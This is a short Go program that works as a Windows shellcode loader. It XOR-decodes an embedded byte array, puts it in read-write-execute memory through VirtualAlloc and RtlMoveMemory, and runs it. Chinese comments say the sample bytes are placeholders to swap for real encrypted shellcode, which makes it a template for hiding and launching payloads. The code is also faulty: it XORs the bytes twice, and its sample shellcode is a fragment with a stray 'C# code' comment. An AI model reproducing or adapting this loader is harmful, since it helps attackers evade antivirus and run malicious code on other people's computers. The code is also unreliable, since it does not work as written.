package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

const key byte = 0xAB // 加密/解密的密钥

var (
	kernel32     = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc = kernel32.MustFindProc("VirtualAlloc")
	rtlMoveMem   = kernel32.MustFindProc("RtlMoveMemory")
)

func encryptDecrypt(data []byte) {
	for i := range data {
		data[i] = data[i] ^ key // 使用异或算法进行加密和解密
	}
}

func executeShellcode(shellcode []byte) {
	// 加密shellcode
	encryptDecrypt(shellcode)

	addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	if addr == 0 {
		panic(fmt.Sprintf("VirtualAlloc failed with error code: %d", err))
	}

	_, _, err = rtlMoveMem.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != 0 {
		panic(fmt.Sprintf("RtlMoveMemory failed with error code: %d", err))
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	// 原始的加密shellcode，这里只是一个示例，实际使用时应该是真实的加密shellcode
	shellcode := []byte{
		// C# code:
		// ...
		0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x53, 0x56, 0x57, 0x8B, 0x7D, 0x08,
		0x8B, 0xD7, 0x8B, 0xCF, 0x8B, 0xC7, 0x8B, 0x45, 0x3C, 0x8B, 0x54, 0x05,
		0x78, 0x01, 0xEA, 0x8B, 0x4A, 0x18, 0x8B, 0x5A, 0x20, 0x8B, 0x12, 0xEB,
		0x09, 0x8B, 0x4A, 0x3C, 0x83, 0xE3, 0xF8, 0x03, 0xCA, 0x8B, 0x59, 0x24,
		0x03, 0xDD, 0x50, 0xFF, 0xD2, 0x83, 0xC4, 0x10, 0x5F, 0x5E, 0x5B, 0x83,
		0xC4, 0x10, 0xC3,
	}

	// 解密shellcode
	encryptDecrypt(shellcode)

	executeShellcode(shellcode)
}
